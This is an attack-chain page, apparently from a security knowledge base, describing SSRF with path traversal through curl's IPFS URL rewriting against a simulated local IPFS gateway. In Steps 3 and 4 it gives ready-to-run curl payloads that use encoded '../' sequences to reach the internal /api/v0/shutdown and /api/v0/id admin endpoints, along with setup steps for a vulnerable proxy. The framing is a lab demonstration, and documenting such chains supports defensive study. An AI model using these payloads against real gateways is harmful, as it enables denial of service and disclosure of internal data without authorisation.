---
tags:
  - ssrf
  - path-traversal
  - ipfs
  - curl
  - denial-of-service
  - information-disclosure
type: attack_chain
tools:
  - '[[tools/Python]]'
  - '[[tools/curl]]'
tactics:
  - '[[Initial Access]]'
  - '[[Collection]]'
verified: false
platforms:
  - Linux
  - Web
submitted: true
complexity: medium
created_at: '2023-10-01T00:00:00Z'
procedures:
  - '[[procedures/Setup-Simulated-IPFS-Admin-API-Server]]'
  - '[[procedures/Configure-and-Start-Vulnerable-curl-IPFS-Proxy]]'
  - '[[procedures/Exploit-SSRF-with-Crafted-IPFS-URL-for-Shutdown]]'
  - '[[procedures/Verify-Exploitation-and-Observe-Internal-Access]]'
step_count: 4
techniques:
  - '[[Exploit Public-Facing Application]]'
  - '[[File and Directory Discovery]]'
updated_at: '2025-12-14T03:53:38.423Z'
description: >-
  Demonstrates SSRF combined with path traversal in curl's IPFS URL rewriting
  function, allowing attackers to force requests to internal IPFS gateway admin
  endpoints for DoS or information disclosure.
skill_level: intermediate
impact_level: high
id: 7ffca4d2-e9bb-4111-b381-a385c7700358
validated: true
mitre_tactics:
  - '[[Initial Access]]'
  - '[[Collection]]'
mitre_techniques:
  - '[[Exploit Public-Facing Application]]'
  - '[[File and Directory Discovery]]'
---
# SSRF and Path Traversal via Malicious IPFS URLs in curl to Access Internal Gateway Endpoints

Multi-stage attack chain demonstrating exploitation of curl's ipfs_url_rewrite() function vulnerability, enabling SSRF and path traversal to internal IPFS gateway endpoints.

## Chain Metrics Dashboard

| Metric | Value |
|--------|-------|
| Chain Status | Unverified |
| Total Steps | 4 |
| Execution Time | ~5 minutes |
| Skill Level | Intermediate |
| Complexity | Medium |
| Impact Level | High |

## Attack Flow Visualization

```mermaid
graph LR
    A[Setup Internal Admin Server] --> B[Start Vulnerable Proxy]
    B --> C[Send Malicious IPFS URL]
    C --> D[Observe Internal Access and Effects]

    style A fill:#e74c3c
    style B fill:#f39c12
    style C fill:#3498db
    style D fill:#27ae60
```

## Prerequisites & Requirements

### Required Tools

- [[tools/Python]]
- [[tools/curl]]

### Target Environment

- Linux platform
- Ports 5001 (admin API) and 9000 (proxy) available
- Simulated IPFS gateway services

### Initial Access Requirements

- Local network access to run simulation
- No external credentials needed for demo; assumes attacker can send requests to victim proxy

## Detailed Attack Procedures

### Step 1: Setup Internal Admin Server
procedure: [[procedures/Setup-Simulated-IPFS-Admin-API-Server]]

**Objective**: Simulate the target IPFS gateway's internal admin API to receive and log unauthorized requests.

**Instructions**: Start the admin API server using [[commands/start-ipfs-admin-api]]:

```bash
python3 admin_api.py
```

**Expected Output**: Server listening on 127.0.0.1:5001, ready to log requests.

**Success Indicators**:
- Server output confirms listening on port 5001
- No errors in startup

### Step 2: Configure and Start Vulnerable Proxy
procedure: [[procedures/Configure-and-Start-Vulnerable-curl-IPFS-Proxy]]

**Objective**: Set up the vulnerable proxy that uses curl's flawed IPFS URL rewriting to forward requests to the gateway.

**Instructions**: First, set the gateway environment variable with [[commands/set-ipfs-gateway-env]]:

```bash
export IPFS_GATEWAY="http://127.0.0.1:5001/"
```

Then, start the proxy using [[commands/start-vulnerable-proxy]]:

```bash
python3 vulnerable_proxy.py
```

**Expected Output**: Proxy listening on 0.0.0.0:9000, ready to process IPFS URLs.

**Success Indicators**:
- Proxy confirms listening on port 9000
- Environment variable is set correctly

### Step 3: Exploit with Malicious IPFS URL
procedure: [[procedures/Exploit-SSRF-with-Crafted-IPFS-URL-for-Shutdown]]

**Objective**: Send a crafted IPFS URL to trigger SSRF and path traversal to the shutdown endpoint.

**Instructions**: Use [[commands/exploit-ipfs-ssrf-shutdown]] to send the malicious request:

```bash
curl "http://127.0.0.1:9000/?target=ipfs://..%2F..%2Fapi/v0/shutdown"
```

For information disclosure, follow with [[commands/exploit-ipfs-ssrf-id]]:

```bash
curl "http://127.0.0.1:9000/?target=ipfs://..%2F..%2Fapi/v0/id"
```

**Expected Output**: HTTP 200 response with exfiltrated internal data or shutdown confirmation.

**Success Indicators**:
- Proxy logs show rewritten URL to internal endpoint
- Admin server logs incoming request to /api/v0/shutdown or /api/v0/id

### Step 4: Verify and Observe Effects
procedure: [[procedures/Verify-Exploitation-and-Observe-Internal-Access]]

**Objective**: Check logs to confirm the SSRF and path traversal succeeded in accessing internal endpoints.

**Instructions**: Review logs from both admin API and proxy servers. Use verbose curl if needed with [[commands/verbose-exploit-ipfs-ssrf]]:

```bash
curl "http://127.0.0.1:9000/?target=ipfs://..%2F..%2Fapi/v0/id" -vvvv
```

**Expected Output**: Logs showing requests to internal paths and exfiltrated responses.

**Success Indicators**:
- Admin API logs unauthorized access
- Attacker receives internal response via proxy
- Potential DoS if shutdown endpoint hit

## Attack Chain Summary

### Key Achievements

1. Simulated vulnerable curl IPFS handling leading to SSRF
2. Path traversal escaping /ipfs/ sandbox to admin endpoints
3. Demonstrated DoS via shutdown and info disclosure via node ID

## Technique & Tactic Coverage

### MITRE ATT&CK Techniques

- [[Exploit Public-Facing Application]]
- [[File and Directory Discovery]]

### MITRE ATT&CK Tactics

- [[Initial Access]]
- [[Collection]]

---

*Last updated: 2023-10-01T00:00:00Z*
